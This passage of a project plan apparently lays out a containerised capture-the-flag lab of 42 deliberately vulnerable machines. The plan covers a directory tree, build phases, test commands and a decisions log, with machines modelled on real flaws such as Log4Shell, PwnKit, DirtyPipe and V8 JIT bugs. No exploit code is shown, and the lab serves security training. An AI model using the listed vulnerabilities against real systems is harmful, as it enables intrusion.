│   │   ├── 25-redisraider/
│   │   │   ├── docker-compose.yml        # x86_64 (default)
│   │   │   └── docker-compose.mips.yml   # MIPS variant
│   │   ├── 26-mongomayhem/
│   │   ├── 27-elasticpwn/
│   │   └── 28-solrblaze/
│   │
│   ├── 05_NetworkAppliance_Proxy/        # Machines 29–32
│   │   ├── 29-bigipwned/
│   │   ├── 30-citrixbreaker/
│   │   ├── 31-ivantigate/
│   │   └── 32-minioleaker/
│   │
│   ├── 06_Data_FileTransfer/            # Machines 33–35
│   │   ├── 33-moveitmstr/
│   │   ├── 34-apachenght/
│   │   └── 35-goanywher/
│   │
│   ├── 07_Privilege_Escalation/          # Machines 36–38
│   │   ├── 36-baronsamedit/
│   │   ├── 37-pwnkit/
│   │   └── 38-dirtypipe/                # cgroup escape (gated)
│   │
│   └── 08_Advanced_Exploitation/         # Machines 39–42
│       ├── 39-v8-maprem/
│       │   ├── docker-compose.yml        # x86_64 (default, uses pre-built d8)
│       │   ├── docker-compose.arm64.yml  # ARM variant
│       │   ├── Dockerfile
│       │   ├── Dockerfile.arm64
│       │   ├── healthcheck.sh
│       │   ├── v8-build/
│       │   │   └── BUILD_FROM_SOURCE.md  # Full source build instructions
│       │   ├── harness/
│       │   ├── flags/
│       │   ├── README.md
│       │   └── writeup/
│       │       ├── solution.md
│       │       ├── exploit.js
│       │       └── references.md
│       ├── 40-v8-turboconf/
│       ├── 41-v8-oobarray/
│       └── 42-jsc-jitrce/               # PAC bypass documentation
│           ├── docker-compose.yml
│           ├── Dockerfile
│           ├── jsc-build/
│           │   └── BUILD_FROM_SOURCE.md  # Full JSC source build instructions
│           └── ...
│
└── scripts/
    ├── generate-all-flags.sh             # Generate flags for all machines
    ├── reset-machine.sh                  # Reset a single machine
    ├── reset-all.sh                      # Reset all machines
    └── validate-machines.sh              # Test all health checks
```

---

## 11. Implementation Phases

### Phase 1: Foundation (Week 1–2)

| Task | Deliverable |
|------|------------|
| Project scaffolding | Directory structure, `.env`, `run.sh`, `lifecycle-manager.sh` |
| Infrastructure | VPN container, portal stub, shared scripts |
| Template machine | One fully working machine (01-log4hell) as reference |
| Health-check framework | Base health check script, lifecycle manager cron |
| Documentation skeleton | All `docs/` files with structure |

### Phase 2: Core Machines — Web & CMS (Week 3–5)

| Task | Deliverable |
|------|------------|
| Machines 01–07 | Web Server & Runtime category complete with writeups |
| Machines 08–14 | CMS & Web Application category complete with writeups |
| Docker escape (Machine 09) | PressGrave Docker socket escape tested |
| Integration testing | All 14 machines run simultaneously, health checks pass |

### Phase 3: Framework & Enterprise (Week 6–8)

| Task | Deliverable |
|------|------------|
| Machines 15–22 | Framework & Library category complete (incl. React2Shell) |
| Machines 23–28 | Enterprise Middleware category complete |
| Privileged escape (Machine 21) | Container escape tested (with `--enable-escape-challenges`) |
| Multi-arch MIPS (Machine 25) | RedisRaider `docker-compose.mips.yml` variant |
| Load testing | 28 machines concurrent, resource profiling |

### Phase 4: Network, Data & PrivEsc (Week 9–10)

| Task | Deliverable |
|------|------------|
| Machines 29–32 | Network Appliance & Proxy complete |
| Machines 33–35 | Data & File Transfer complete |
| Machines 36–38 | Privilege Escalation Chains complete |
| cgroup escape (Machine 38) | DirtyPipe cgroup escape tested in VM (with `--enable-escape-challenges`) |

### Phase 5: Advanced Exploitation (Week 11–13)

| Task | Deliverable |
|------|------------|
| Machines 39–41 | V8 exploitation challenges (pre-built binaries via GitHub Releases) |
| Machine 42 | JSC/WebKit exploitation with PAC docs |
| ARM variant (Machine 39) | `docker-compose.arm64.yml` QEMU ARM d8 binary tested |
| Source build docs | `BUILD_FROM_SOURCE.md` for V8 and JSC verified |
| All escape paths validated | Tested in VM with `--enable-escape-challenges` |

### Phase 6: Polish & Release (Week 14–15)

| Task | Deliverable |
|------|------------|
| Documentation finalized | All docs complete, no placeholders |
| Web portal complete | Status dashboard + light gamification operational |
| Full integration test | All 42 machines simultaneously |
| Security audit | Escape machines validated in VM (flag-gated) |
| Open source prep | LICENSE, CONTRIBUTING.md, CI pipeline, pre-built binary releases |

---

## 12. Verification Plan

### 12.1 Automated Tests

```bash
# Per-machine validation
./scripts/validate-machines.sh           # Health checks on all 42 machines
./scripts/validate-machines.sh 01        # Single machine validation

# Integration test (standard — no escape challenges)
docker compose -f docker-compose.yml up -d
for i in machines/*/*/docker-compose.yml; do
  docker compose -f "$i" up -d
done
./scripts/validate-machines.sh

# Integration test (with escape challenges — VM only!)
./run.sh up --enable-escape-challenges
./scripts/validate-machines.sh --include-escapes

# Multi-arch test
docker compose -f machines/04_Enterprise_Middleware/25-redisraider/docker-compose.yml \
               -f machines/04_Enterprise_Middleware/25-redisraider/docker-compose.mips.yml up -d
docker compose -f machines/08_Advanced_Exploitation/39-v8-maprem/docker-compose.yml \
               -f machines/08_Advanced_Exploitation/39-v8-maprem/docker-compose.arm64.yml up -d
```

### 12.2 Manual Verification

| Check | Method |
|-------|--------|
| Kill chain works end-to-end | Solve each machine following writeup |
| Flags are unique per seed | Change `FLAG_SEED`, verify flags change |
| Health checks detect failure | Kill the vulnerable service, verify restart |
| Lifecycle manager resets at 60 min | Start machine, wait 61 min, verify fresh state |
| Escape flag gating works | Run without `--enable-escape-challenges`, verify Docker socket not mounted |
| Escape challenges contained | Run with flag in VM, verify no host damage |
| Multi-arch compose files work | Run ARM/MIPS via `-f docker-compose.arm64.yml` override |
| Pre-built binaries match source | Build V8/JSC from source, diff against pre-built |
| Gamification tracking works | Submit flags via portal, verify points and progress |
| Documentation accuracy | Follow every doc as a new user |

---

## Decisions Log (Resolved)

| # | Question | Decision | Impact |
|---|----------|----------|--------|
| Q1 | Portal: gamification or simple dashboard? | **Simple dashboard + light gamification** — Flag submission, point values per difficulty, personal progress heatmap, first blood badges. No public leaderboard. | Portal design updated in §8.2 |
| Q2 | Escape challenges: always-on or gated? | **Gated behind `--enable-escape-challenges` flag** — Escape misconfigs are stripped at runtime when flag is not set. Machines still work for primary kill chain. | Safety model updated in §8B, run.sh behavior defined |
| Q3 | Multi-arch: optional overrides or mandatory? | **Mandatory, separate `docker-compose.{arch}.yml` files** — Each multi-arch machine ships with dedicated override compose files. `qemu-user-static` required on host. | Compose structure updated in §8C, dir structure updated in §10 |
| Q4 | Browser exploit binaries: pre-built or source? | **Pre-built via GitHub Releases + source build documentation** — Default uses pre-built binaries for fast setup. `BUILD_FROM_SOURCE.md` in each machine's build dir for users who want to compile from vulnerable commits. | Build strategy updated in §8A, dir structure updated in §10 |
| Q5 | New machine: React2Shell? | **Added as Machine 22 (CVE-2025-55182)** — CVSS 10.0, React Server Components Flight protocol insecure deserialization. Placed in Category 3 (Framework & Library). All subsequent machines renumbered +1. | Machine list updated, numbering shifted across §5, §8B, §8C, §10, §11 |
